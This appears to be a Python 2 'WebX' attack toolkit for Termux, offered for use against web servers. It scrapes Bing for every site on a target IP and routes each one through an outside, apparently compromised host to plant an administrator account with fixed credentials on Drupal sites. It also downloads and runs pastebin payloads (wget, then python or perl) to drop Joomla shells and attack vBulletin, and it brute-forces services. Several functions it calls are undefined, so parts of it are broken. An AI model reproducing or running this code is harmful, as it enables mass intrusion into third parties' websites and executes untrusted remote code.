#!/usr/bin/env/python2
#-*- encoding: utf-8 -*-

import os
import re
import sys
import glob
import time
import json
import Queue
import random
import socket
import urllib
import urllib2
import httplib
import argparse
import telnetlib
import threading
import subprocess

#import requests

import base64
from sys import argv
from commands import *
from time import sleep
from platform import system
from xml.dom import minidom
from getpass import getpass
from urlparse import urlparse
from optparse import OptionParser

# Set color
R = '\033[31m' # Red
N = '\033[1;37m' # White
G = '\033[32m' # Green
O = '\033[0;33m' # Orange
B = '\033[1;34m' #Blue

def force_to_unicode(text): 
  "If text is unicode, it is returned as is. If it's str, convert it to Unicode using UTF-8 encoding" 
  return text if isinstance(text, unicode) else text.decode('utf8')
  
directories = ['/uploads/', '/upload/', '/files/', '/resume/', '/resumes/', '/documents/', '/docs/', '/pictures/', '/file/', '/Upload/', '/Uploads/', '/Resume/', '/Resume/', '/UsersFiles/', '/Usersiles/', '/usersFiles/', '/Users_Files/', '/UploadedFiles/',
               '/Uploaded_Files/', '/uploadedfiles/', '/uploadedFiles/', '/hpage/', '/admin/upload/', '/admin/uploads/', '/admin/resume/', '/admin/resumes/', '/admin/pictures/', '/pics/', '/photos/', '/Alumni_Photos/', '/alumni_photos/', '/AlumniPhotos/', '/users/']
shells = ['wso.php', 'shell.php', 'an.php', 'hacker.php', 'lol.php', 'up.php', 'cp.php', 'upload.php',
          'sh.php', 'pk.php', 'mad.php', 'x00x.php', 'worm.php', '1337worm.php', 'config.php', 'x.php', 'haha.php']
upload = []
yes = set(['yes', 'y', 'ye', 'Y'])
no = set(['no', 'n'])

os.system('clear')

os.system("termux-setup-storage")
os.system("apt update && apt upgrade")

os.system('clear')

def menu():
    print("""
    """)
    os.system("cd core;python2 webx.py")
    os.system("cd core;python2 note.py")
    os.system("cd core;python2 info.py")
    choice = raw_input(""+R+"Web"+B+"X>> ")
    os.system('clear')
    if choice == "1":
       webx()
    elif choice == "2":
       abt()
    elif choice == "x":
       sys.exit(), sys.exit
    elif choice == " ":
       menu()
    else:
       menu()
  
def webx():
		
    os.system("cd core;python2 table.py")
    
    choiceweb = raw_input(""+R+"Web"+B+"X>> ")
    if choiceweb == "1":
        cix()
    elif choiceweb == "2":
        dul()
    elif choiceweb == "3":
        wrdprs()
    elif choiceweb == "4":
    	jms()
    elif choiceweb == "5":
    	brtx()
    elif choiceweb == "6":
    	vbtin()
    elif choiceweb == "7":
    	arch()
    elif choiceweb == "8":
    	fads()
    elif choiceweb == "x":
    	menu()
    elif choiceweb == "":
    	webx()
    else:
    	webx()
    os.system('clear')

def abt():
	
	os.system("cd core;python2 about.py")
	about = raw_input(""+R+"Web"+B+"X>> ")
	if about == "c":
		webx()
	if about == "b":
		menu()
	if about == "m":
		webx()
	if about == " ":
		abt()
    
def cix():
    time.sleep(0.5)
    os.system("cd core;python2 commix.py") 

def wrdprs():
	time.sleep(0.5)
	os.system("cd core;python2 drupal.py")
	print
	chooce = raw_input(""+R+"Web"+B+"X>> ")
	while True:
		if chooce == "1":
			drupal()
		if chooce == "2":
			getdrupal()
		if chooce == "3":
			drupallist()
		if chooce == "x":
		    webx()
		if chooce == "":
			dul()
	    
def drupal():
    ''' Drupal Exploit Binger All Websites Of server '''
    ip = raw_input('1- IP >> ')
    page = 1
    while page <= 50:

        url = "http://www.bing.com/search?q=ip%3A" + ip + "&go=Valider&qs=n&form=QBRE&pq=ip%3A" + \
            ip + "&sc=0-0&sp=-1&sk=&cvid=af529d7028ad43a69edc90dbecdeac4f&first=" + \
            str(page)
        req = urllib2.Request(url)
        opreq = urllib2.urlopen(req).read()
        findurl = re.findall(
            '<div class="b_title"><h2><a href="(.*?)" h=', opreq)
        page += 1

        for url in findurl:
            try:

                urlpa = urlparse(url)
                site = urlpa.netloc

                print "[+] Testing At " + site
                resp = urllib2.urlopen(
                    'http://crig-alda.ro/wp-admin/css/index2.php?url=' + site + '&submit=submit')
                read = resp.read()
                if "User : HolaKo" in read:
                    print "Exploit found =>" + site

                    print "user:HolaKo\npass:admin"
                    a = open('up.txt', 'a')
                    a.write(site + '\n')
                    a.write("user:" + user + "\npass:" + pwd + "\n")
                else:
                    print "[-] Exploit Not Found :( "

            except Exception as ex:
                print ex
                sys.exit(0)

              #Get Drupal Websites
              
def getdrupal():
    ip = raw_input('Enter IP >>  ')
    page = 1
    sites = list()
    while page <= 50:

        url = "http://www.bing.com/search?q=ip%3A" + ip + \
            "+node&go=Valider&qs=ds&form=QBRE&first=" + str(page)
        req = urllib2.Request(url)
        opreq = urllib2.urlopen(req).read()
        findurl = re.findall(
            '<div class="b_title"><h2><a href="(.*?)" h=', opreq)
        page += 1

        for url in findurl:
            split = urlparse(url)
            site = split.netloc
            if site not in sites:
                print site
                sites.append(site)
                
                #Drupal Mass Exploiter

def drupallist():
    listop = raw_input("Enter list Txt >> ")
    fileopen = open(listop, 'r')
    content = fileopen.readlines()
    for i in content:
        url = i.strip()
        try:
            openurl = urllib2.urlopen(
                'http://crig-alda.ro/wp-admin/css/index2.php?url=' + url + '&submit=submit')
            readcontent = openurl.read()
            if "Success" in readcontent:
                print "[+]Success =>" + url
                print "[-]username:HolaKo\n[-]password:admin"
                save = open('drupal.txt', 'a')
                save.write(
                    url + "\n" + "[-]username:HolaKo\n[-]password:admin\n")

            else:
                print i + "=> exploit not found "
        except Exception as ex:
            print ex
            
            #Wordpress & Joomla Scanner
def wdjmscan():
	time.sleep(0.5)
	os.system("cd core;python2 wordpress.py")
	print
	wordpress = raw_input(""+R+"Web"+B+"X>> ")
	while True:
		if wordpress == "1":
			wdjmscan()
		if wordpress == "2":
			expscan()
		if wordpress == "3":
			plgscan()
		if wordpress == "x":
			webx()
		if wordpress == "":
			wrdprs()

def wrdscan():

    ipp = raw_input('Enter Target IP : ')
    sites = bing_all_grabber(str(ipp))
    wordpress = check_wordpress(sites)
    joomla = check_joomla(sites)
    for ss in wordpress:
        print ss
    print '[+] Found ! ', len(wordpress), ' Wordpress Websites'
    print '-' * 30 + '\n'
    for ss in joomla:
        print ss

    print '[+] Found ! ', len(joomla), ' Joomla Websites'

    print '\n'
# initialise the fscan function


class dzz():
    def __init__(self):
        clearScr()
        aaa = raw_input("Target IP : ")
        Fscan(aaa)
############################


class bcolors:
    HEADER = ''
    OKBLUE = ''
    OKGREEN = ''
    WARNING = ''
    FAIL = ''
    ENDC = ''
    CYAN = ''


class colors():
    PURPLE = ''
    CYAN = ''
    DARKCYAN = ''
    BLUE = ''
    GREEN = ''
    YELLOW = ''
    RED = ''
    BOLD = ''
    ENDC = ''
    
    #WP Plugins Scanner

def plgscan():
    Notfound = [404, 401, 400, 403, 406, 301]
    sitesfile = raw_input("sites file : ")
    filepath = raw_input("Plugins File : ")

    def scan(site, dir):
        global resp
        try:
            conn = httplib.HTTPConnection(site)
            conn.request('HEAD', "/wp-content/plugins/" + dir)
            resp = conn.getresponse().status
        except(), message:
            print "Cant Connect :", message
            pass

    def timer():
        now = time.localtime(time.time())
        return time.asctime(now)

    def main():
        sites = open(sitesfile).readlines()
        plugins = open(filepath).readlines()
        for site in sites:
            site = site.rstrip()
        for plugin in plugins:
            plugin = plugin.rstrip()
            scan(site, plugin)
            if resp not in Notfound:
                print "+----------------------------------------+"
                print "| current site :" + site
                print "| Found Plugin : " + plugin
                print "| Result:", resp
                
                #WP Exploit Scanner
                
def expscan():
    ip = raw_input('Enter IP : ')
    sites = bing_all_grabber(str(ip))
    wordpress = check_wordpress(sites)
    wpstorethemeremotefileupload = check_wpstorethemeremotefileupload(sites)
    wpcontactcreativeform = check_wpcontactcreativeform(sites)
    wplazyseoplugin = check_wplazyseoplugin(sites)
    wpeasyupload = check_wpeasyupload(sites)
    wpsymposium = check_wpsymposium(sites)
    for ss in wordpress:
        print ss
    print '[*] Found, ', len(wordpress), ' wordpress sites.'
    print '-' * 30 + '\n'
    for ss in wpstorethemeremotefileupload:
        print ss
    print '[*] Found, ', len(wpstorethemeremotefileupload), ' wp_storethemeremotefileupload exploit.'
    print '-' * 30 + '\n'
    for ss in wpcontactcreativeform:
        print ss
    print '[*] Found, ', len(wpcontactcreativeform), ' wp_contactcreativeform exploit.'
    print '-' * 30 + '\n'
    for ss in wplazyseoplugin:
        print ss
    print '[*] Found, ', len(wplazyseoplugin), ' wp_lazyseoplugin exploit.'
    print '-' * 30 + '\n'
    for ss in wpeasyupload:
        print ss
    print '[*] Found, ', len(wpeasyupload), ' wp_easyupload exploit.'
    print '-' * 30 + '\n'
    for ss in wpsymposium:
        print ss

    print '[*] Found, ', len(wpsymposium), ' wp_sympsiup exploit.'

    print '\n'
    
    #Joomla

def jms():
	time.sleep(0.5)
	print
	os.system("cd core;python2 joomla.py")
	joomla = raw_input(""+R+"Web"+B+"X>> ")
	if joomla == "1":
		wdjmscan()
	if joomla == "2":
		recodex()
	if joomla == "x":
		webx()
	if joomla == "":
		joomla()

def recodex():
    os.system("wget http://pastebin.com/raw/EX7Gcbxk --output-document=temp.py")
    clearScr()
    print("if the response is 200 , you will find your shell in Joomla_3.5_Shell.txt")
    jmtarget = raw_input("Select a targets list :")
    os.system("python temp.py %s" % jmtarget)
    
    #BruteX
   
def brtx():
    os.system('clear')
    print("Automatically brute force all services running on a target : Open ports / DNS domains / Usernames / Passwords ")
    os.system("git clone https://github.com/1N3/BruteX.git")
    os.system('clear')
    brutexchoice = raw_input("Select a Target : ")
    os.system("cd BruteX && chmod 777 brutex && ./brutex %s" % brutexchoice)
    
    #Vbullitin
    
def vbtin():
    os.system("wget http://pastebin.com/raw/eRSkgnZk --output-document=tmp.pl")
    os.system("perl tmp.pl")
    
    #Ararchin

def arch():
    print("Arachni is a feature-full, modular, high-performance Ruby framework aimed towards helping penetration testers and administrators evaluate the security of web applications")
    cara = raw_input("Install And Run ? Y / N : ")
    clearScr()
    print("exemple : http://www.target.com/")
    tara = raw_input("Select a target to scan : ")
    if cara in yes:        
        os.system("git clone git://github.com/Arachni/arachni.git")
        os.system(
            "cd arachni && sudo gem install bundler && bundle install --without prof && rake install")
        os.system("archani")
    clearScr()
    os.system("cd arachni/bin && chmod 777 arachni && ./arachni %s" % tara)

    #File And Directory Checker
    
def fads():
    ip = raw_input('Enter IP -> ')
    grabsqli(ip)

		
if __name__ == "__main__":
    try:
        menu()
    except KeyboardInterrupt:
        print(" Finishing up...\r"),
        time.sleep(0.25)
